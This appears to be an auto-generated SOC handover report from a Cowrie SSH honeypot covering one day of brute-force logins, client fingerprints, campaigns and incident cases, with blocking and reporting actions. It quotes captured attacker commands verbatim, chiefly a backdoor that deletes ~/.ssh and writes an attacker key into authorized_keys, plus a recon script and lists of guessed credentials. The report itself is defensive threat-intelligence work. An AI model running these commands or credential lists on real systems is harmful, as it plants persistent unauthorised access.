# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-13 |
| **Generated At** | 2026-10-13T18:39:59Z |
| **Shift Time** | 18:39 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **368** |
| Confirmed Threats | **311** |
| False Positives Filtered | **57** (15.5%) |
| Unique Attacker IPs | **254** |
| Countries of Origin | **44** |
| High Severity Cases | **156** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **212** |
| Malware Samples Analyzed | **7** HIGH · **25** MED · 7 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **4467** |
| Unique Credential Pairs | **4259** |
| Unique Usernames | **2012** |
| Unique Passwords | **1370** |
| Successful Auth Pairs | **4369** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 190 |
| `345gs5662d34` | 62 |
| `admin` | 40 |
| `support` | 28 |
| `ubuntu` | 19 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 62 |
| `3245gs5662d34` | 62 |
| `support` | 32 |
| `` | 27 |
| `admin` | 21 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 62 |
| `support` | `support` | 25 |
| `root` | `3245gs5662d34` | 24 |
| `root` | `` | 24 |
| `admin` | `admin` | 13 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `sol` | `B1ockch@in` | `45.148.10.240` | 2026-10-13T02:55:35 |
| `validator` | `B1ockch@in` | `45.148.10.240` | 2026-10-13T02:57:05 |
| `support` | `support` | `10.0.0.73` | 2026-10-13T02:57:47 |
| `blockrazor` | `B1ockch@in` | `45.148.10.240` | 2026-10-13T02:58:39 |
| `blockrazor` | `blockrazor` | `45.148.10.240` | 2026-10-13T03:00:10 |
| `blockrazor` | `B1ockr@z0r` | `45.148.10.240` | 2026-10-13T03:01:39 |
| `ubuntu` | `B1ockr@z0r` | `45.148.10.240` | 2026-10-13T03:03:12 |
| `ubuntu` | `B1ockR@z0r` | `45.148.10.240` | 2026-10-13T03:04:52 |
| `ubuntu` | `b10ckr2z0r` | `45.148.10.240` | 2026-10-13T03:06:31 |
| `ubuntu` | `blockr@zor@123` | `45.148.10.240` | 2026-10-13T03:08:03 |
| `low` | `low` | `171.237.176.209` | 2026-10-13T03:24:33 |
| `345gs5662d34` | `345gs5662d34` | `171.237.176.209` | 2026-10-13T03:24:37 |
| `low` | `3245gs5662d34` | `171.237.176.209` | 2026-10-13T03:24:39 |
| `root` | `1qaz2wsx#edc` | `161.10.69.230` | 2026-10-13T03:25:39 |
| `345gs5662d34` | `345gs5662d34` | `161.10.69.230` | 2026-10-13T03:25:42 |
| `root` | `3245gs5662d34` | `161.10.69.230` | 2026-10-13T03:25:43 |
| `orann` | `orann` | `152.32.188.136` | 2026-10-13T03:25:53 |
| `345gs5662d34` | `345gs5662d34` | `152.32.188.136` | 2026-10-13T03:25:57 |
| `orann` | `3245gs5662d34` | `152.32.188.136` | 2026-10-13T03:26:00 |
| `root` | `password` | `193.112.192.91` | 2026-10-13T03:27:27 |
_… 4349 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **368** |
| Sessions with Fingerprint | **25** |
| Unique HASSH Fingerprints | **25** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 133 |
| Go SSH scanner | 61 |
| Paramiko (Python) | 5 |
| PuTTY | 4 |
| Unknown | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 105 | 57 |
| `084386fa7ae5...` | Mirai/variant | 11 | 11 |
| `0a07365cc01f...` | Generic scanner | 11 | 8 |
| `2ec37a7cc8da...` | Mirai/variant | 11 | 3 |
| `16443846184e...` | Generic scanner | 7 | 4 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 105 | 57 | Mirai/variant |
| `95420f9d932d...` | libssh | 21 | 14 | — |
| `084386fa7ae5...` | Go SSH scanner | 11 | 11 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 11 | 8 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 11 | 3 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 7 | 4 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 7 | 1 | Modern SSH client |
| `f1e5e9d24e5e...` | Go SSH scanner | 7 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **16** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 100 | 3 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 50 | 50 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `80.94.92.179`, `193.32.162.84`, `92.118.39.50`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `171.237.176.209`, `223.17.1.118`, `101.36.119.203`, `112.217.188.122`, `209.99.190.200`, `40.117.97.0`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **254** |
| Unique ASNs | **118** |
| High-Risk ASNs | **85** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 61 | HIGH |
| `AS4766` | Korea Telecom | 11 | HIGH |
| `AS14061` | DigitalOcean, LLC | 10 | HIGH |
| `AS8075` | Microsoft Corporation | 9 | HIGH |
| `AS198364` | BANATSYNC SRL | 8 | HIGH |
| `AS4134` | CHINANET BACKBONE | 7 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 4 | HIGH |
| `AS6939` | Hurricane Electric LLC | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (151)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-27da9920a2a7

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-10-13 02:55 |
| **Last Seen** | 2026-10-13 02:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-13 02:55:35` | `cowrie.session.connect` |
| `2026-10-13 02:55:35` | `cowrie.client.version` |
| `2026-10-13 02:55:35` | `cowrie.client.kex` |
| `2026-10-13 02:55:35` | `cowrie.login.success` |
| `2026-10-13 02:55:36` | `cowrie.session.params` |
| `2026-10-13 02:55:36` | `cowrie.command.input` |
| `2026-10-13 02:55:36` | `cowrie.log.closed` |
| `2026-10-13 02:55:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-194959da1101

| Field | Detail |
|---|---|
| **Source IP** | `171.237.176[.]209` |
| **First Seen** | 2026-10-13 03:24 |
| **Last Seen** | 2026-10-13 03:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-13 03:24:32` | `cowrie.session.connect` |
| `2026-10-13 03:24:32` | `cowrie.client.version` |
| `2026-10-13 03:24:32` | `cowrie.client.kex` |
| `2026-10-13 03:24:33` | `cowrie.login.success` |
| `2026-10-13 03:24:34` | `cowrie.session.params` |
| `2026-10-13 03:24:34` | `cowrie.command.input` |
| `2026-10-13 03:24:34` | `cowrie.command.failed` |
| `2026-10-13 03:24:34` | `cowrie.log.closed` |
| `2026-10-13 03:24:35` | `cowrie.session.params` |
| `2026-10-13 03:24:35` | `cowrie.command.input` |
| `2026-10-13 03:24:36` | `cowrie.session.file_download` |
| `2026-10-13 03:24:36` | `cowrie.log.closed` |
| `2026-10-13 03:24:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.237.176[.]209` to AbuseIPDB if not already reported
- [ ] Block `171.237.176[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b97dfd366dd

| Field | Detail |
|---|---|
| **Source IP** | `171.237.176[.]209` |
| **First Seen** | 2026-10-13 03:24 |
| **Last Seen** | 2026-10-13 03:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-13 03:24:36` | `cowrie.session.connect` |
| `2026-10-13 03:24:36` | `cowrie.client.version` |
| `2026-10-13 03:24:36` | `cowrie.client.kex` |
| `2026-10-13 03:24:37` | `cowrie.login.success` |
| `2026-10-13 03:24:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.237.176[.]209` to AbuseIPDB if not already reported
- [ ] Block `171.237.176[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfef5afc7a70

| Field | Detail |
|---|---|
| **Source IP** | `161.10.69[.]230` |
| **First Seen** | 2026-10-13 03:25 |
| **Last Seen** | 2026-10-13 03:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-13 03:25:39` | `cowrie.session.connect` |
| `2026-10-13 03:25:39` | `cowrie.client.version` |
| `2026-10-13 03:25:39` | `cowrie.client.kex` |
| `2026-10-13 03:25:39` | `cowrie.login.success` |
| `2026-10-13 03:25:40` | `cowrie.session.params` |
| `2026-10-13 03:25:40` | `cowrie.command.input` |
| `2026-10-13 03:25:40` | `cowrie.command.failed` |
| `2026-10-13 03:25:40` | `cowrie.log.closed` |
| `2026-10-13 03:25:41` | `cowrie.session.params` |
| `2026-10-13 03:25:41` | `cowrie.command.input` |
| `2026-10-13 03:25:41` | `cowrie.session.file_download` |
| `2026-10-13 03:25:41` | `cowrie.log.closed` |
| `2026-10-13 03:25:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.10.69[.]230` to AbuseIPDB if not already reported
- [ ] Block `161.10.69[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dad36992297

| Field | Detail |
|---|---|
| **Source IP** | `161.10.69[.]230` |
| **First Seen** | 2026-10-13 03:25 |
| **Last Seen** | 2026-10-13 03:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-13 03:25:41` | `cowrie.session.connect` |
| `2026-10-13 03:25:41` | `cowrie.client.version` |
| `2026-10-13 03:25:41` | `cowrie.client.kex` |
| `2026-10-13 03:25:42` | `cowrie.login.success` |
| `2026-10-13 03:25:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.10.69[.]230` to AbuseIPDB if not already reported
- [ ] Block `161.10.69[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f00bdd3433d2

| Field | Detail |
|---|---|
| **Source IP** | `152.32.188[.]136` |
| **First Seen** | 2026-10-13 03:25 |
| **Last Seen** | 2026-10-13 03:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-13 03:25:52` | `cowrie.session.connect` |
| `2026-10-13 03:25:52` | `cowrie.client.version` |
| `2026-10-13 03:25:52` | `cowrie.client.kex` |
| `2026-10-13 03:25:53` | `cowrie.login.success` |
| `2026-10-13 03:25:54` | `cowrie.session.params` |
| `2026-10-13 03:25:54` | `cowrie.command.input` |
| `2026-10-13 03:25:54` | `cowrie.command.failed` |
| `2026-10-13 03:25:54` | `cowrie.log.closed` |
| `2026-10-13 03:25:55` | `cowrie.session.params` |
| `2026-10-13 03:25:55` | `cowrie.command.input` |
| `2026-10-13 03:25:55` | `cowrie.session.file_download` |
| `2026-10-13 03:25:55` | `cowrie.log.closed` |
| `2026-10-13 03:26:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.188[.]136` to AbuseIPDB if not already reported
- [ ] Block `152.32.188[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44d38e947c77

| Field | Detail |
|---|---|
| **Source IP** | `152.32.188[.]136` |
| **First Seen** | 2026-10-13 03:25 |
| **Last Seen** | 2026-10-13 03:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-13 03:25:56` | `cowrie.session.connect` |
| `2026-10-13 03:25:56` | `cowrie.client.version` |
| `2026-10-13 03:25:56` | `cowrie.client.kex` |
| `2026-10-13 03:25:57` | `cowrie.login.success` |
| `2026-10-13 03:25:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.188[.]136` to AbuseIPDB if not already reported
- [ ] Block `152.32.188[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93090314dbaf

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-10-13 03:27 |
| **Last Seen** | 2026-10-13 03:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-13 03:27:26` | `cowrie.session.connect` |
| `2026-10-13 03:27:26` | `cowrie.client.version` |
| `2026-10-13 03:27:26` | `cowrie.client.kex` |
| `2026-10-13 03:27:27` | `cowrie.login.success` |
| `2026-10-13 03:27:28` | `cowrie.session.params` |
| `2026-10-13 03:27:28` | `cowrie.command.input` |
| `2026-10-13 03:27:30` | `cowrie.log.closed` |
| `2026-10-13 03:27:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-029e965ba994

| Field | Detail |
|---|---|
| **Source IP** | `125.142.37[.]91` |
| **First Seen** | 2026-10-13 03:28 |
| **Last Seen** | 2026-10-13 03:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-13 03:28:27` | `cowrie.session.connect` |
| `2026-10-13 03:28:27` | `cowrie.client.version` |
| `2026-10-13 03:28:27` | `cowrie.client.kex` |
| `2026-10-13 03:28:28` | `cowrie.login.success` |
| `2026-10-13 03:28:29` | `cowrie.session.params` |
| `2026-10-13 03:28:29` | `cowrie.command.input` |
| `2026-10-13 03:28:29` | `cowrie.command.failed` |
| `2026-10-13 03:28:30` | `cowrie.log.closed` |
| `2026-10-13 03:28:31` | `cowrie.session.params` |
| `2026-10-13 03:28:31` | `cowrie.command.input` |
| `2026-10-13 03:28:31` | `cowrie.session.file_download` |
| `2026-10-13 03:28:31` | `cowrie.log.closed` |
| `2026-10-13 03:28:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.142.37[.]91` to AbuseIPDB if not already reported
- [ ] Block `125.142.37[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-906171635987

| Field | Detail |
|---|---|
| **Source IP** | `125.142.37[.]91` |
| **First Seen** | 2026-10-13 03:28 |
| **Last Seen** | 2026-10-13 03:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-13 03:28:31` | `cowrie.session.connect` |
| `2026-10-13 03:28:31` | `cowrie.client.version` |
| `2026-10-13 03:28:31` | `cowrie.client.kex` |
| `2026-10-13 03:28:32` | `cowrie.login.success` |
| `2026-10-13 03:28:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.142.37[.]91` to AbuseIPDB if not already reported
- [ ] Block `125.142.37[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5d3fbfd48d3

| Field | Detail |
|---|---|
| **Source IP** | `103.146.52[.]157` |
| **First Seen** | 2026-10-13 03:33 |
| **Last Seen** | 2026-10-13 03:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-13 03:33:48` | `cowrie.session.connect` |
| `2026-10-13 03:33:48` | `cowrie.client.version` |
| `2026-10-13 03:33:48` | `cowrie.client.kex` |
| `2026-10-13 03:33:48` | `cowrie.login.success` |
| `2026-10-13 03:33:49` | `cowrie.session.params` |
| `2026-10-13 03:33:49` | `cowrie.command.input` |
| `2026-10-13 03:33:49` | `cowrie.command.failed` |
| `2026-10-13 03:33:49` | `cowrie.log.closed` |
| `2026-10-13 03:33:50` | `cowrie.session.params` |
| `2026-10-13 03:33:50` | `cowrie.command.input` |
| `2026-10-13 03:33:50` | `cowrie.session.file_download` |
| `2026-10-13 03:33:50` | `cowrie.log.closed` |
| `2026-10-13 03:33:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.52[.]157` to AbuseIPDB if not already reported
- [ ] Block `103.146.52[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-513ba8a2d0a4

| Field | Detail |
|---|---|
| **Source IP** | `103.146.52[.]157` |
| **First Seen** | 2026-10-13 03:33 |
| **Last Seen** | 2026-10-13 03:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-13 03:33:50` | `cowrie.session.connect` |
| `2026-10-13 03:33:50` | `cowrie.client.version` |
| `2026-10-13 03:33:50` | `cowrie.client.kex` |
| `2026-10-13 03:33:50` | `cowrie.login.success` |
| `2026-10-13 03:33:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.52[.]157` to AbuseIPDB if not already reported
- [ ] Block `103.146.52[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e193e0c8e40

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-13 03:37 |
| **Last Seen** | 2026-10-13 03:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-13 03:37:52` | `cowrie.session.connect` |
| `2026-10-13 03:37:52` | `cowrie.client.version` |
| `2026-10-13 03:37:52` | `cowrie.client.kex` |
| `2026-10-13 03:37:52` | `cowrie.login.success` |
| `2026-10-13 03:37:52` | `cowrie.direct-tcpip.request` |
| `2026-10-13 03:37:52` | `cowrie.direct-tcpip.data` |
| `2026-10-13 03:37:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e90f1565f75

| Field | Detail |
|---|---|
| **Source IP** | `177.224.220[.]16` |
| **First Seen** | 2026-10-13 03:41 |
| **Last Seen** | 2026-10-13 03:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
